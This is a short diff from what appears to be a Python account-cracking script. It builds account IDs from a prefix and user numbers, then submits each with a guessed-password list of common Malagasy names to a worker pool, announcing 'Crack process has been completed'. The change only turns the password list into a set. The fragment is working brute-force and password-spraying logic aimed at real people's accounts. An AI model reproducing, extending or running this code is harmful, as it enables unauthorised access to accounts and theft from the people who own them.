@@ -174,7 +174,7 @@ def mg_randome():
         print(47*'-')
         for psx in user:
             ids = kode + psx
-            passlist = [ids, psx, 'Malalako','Malala','Rakoto','Seheno','Vadiko','Faniry','Volatina','Sitrak','Tolotra','Tsiory','Malagasy','Sitraka','Fanomezana','Sarobidy','Nantenaina','Nomena','Nyaina','Niaina','Hasina','Ravaka','Felana','Mamisoa','Valisoa','Lalaina','Sahaza','Mahefa','Faneva','Tiavina','Santatra','Fitiavana','Tafita','Jesosy','Finoana','Mihary','Mirana','Volamena','Fitahina','Lataka','Fifaliana','Henintsoa','Lahatra','Nirina','Solofo','Tahiry','Volana','Tahina','Tanjona','Harena','Tsilavina','Safidy','Nomenjanahary','Finaritra','Sariaka','Nekena','Tsiaro','Mihaja','Sombiniaina','Miantsa','Hajaina','Fehizoro','Fandresena','Sarika','Salohy']
+            passlist = {ids, psx, 'Malalako','Malala','Rakoto','Seheno','Vadiko','Faniry','Volatina','Sitrak','Tolotra','Tsiory','Malagasy','Sitraka','Fanomezana','Sarobidy','Nantenaina','Nomena','Nyaina','Niaina','Hasina','Ravaka','Felana','Mamisoa','Valisoa','Lalaina','Sahaza','Mahefa','Faneva','Tiavina','Santatra','Fitiavana','Tafita','Jesosy','Finoana','Mihary','Mirana','Volamena','Fitahina','Lataka','Fifaliana','Henintsoa','Lahatra','Nirina','Solofo','Tahiry','Volana','Tahina','Tanjona','Harena','Tsilavina','Safidy','Nomenjanahary','Finaritra','Sariaka','Nekena','Tsiaro','Mihaja','Sombiniaina','Miantsa','Hajaina','Fehizoro','Fandresena','Sarika','Salohy'}
             mdp2.submit(rndm, ids, passlist)
         print(47*'\n\033[1;37m-')
         print('[√] Crack process has been completed')
